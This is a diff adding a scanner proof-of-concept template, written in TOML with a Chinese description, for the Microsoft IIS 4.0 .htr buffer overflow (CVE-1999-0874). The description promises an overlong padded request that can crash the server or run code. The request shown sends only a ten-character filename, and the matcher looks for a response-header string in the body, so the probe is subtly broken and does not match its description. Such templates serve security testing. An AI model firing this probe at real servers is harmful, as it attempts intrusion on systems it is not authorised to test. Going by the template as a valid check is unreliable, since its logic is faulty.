@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证Microsoft IIS 4.0处理超长.htr文件请求时的缓冲区溢出漏洞。攻击者发送包含填充数据的GET请求至.htr文件，触发堆栈缓冲区溢出，可导致拒绝服务或远程代码执行。参考ExploitDB 19248。"
+id = "POC-AVE-1999-1009"
+name = "Microsoft IIS 4.0 .HTR Buffer Overflow PoC"
+severity = "critical"
+tags = ["ave-1999-1009"]
+vuln_id = [
+    "CVE-1999-0874",
+    "AVE-1999-1009",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAAAABBBB.htr"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Server: Microsoft-IIS/4.0",
+    "500",
+    "401.2",
+]
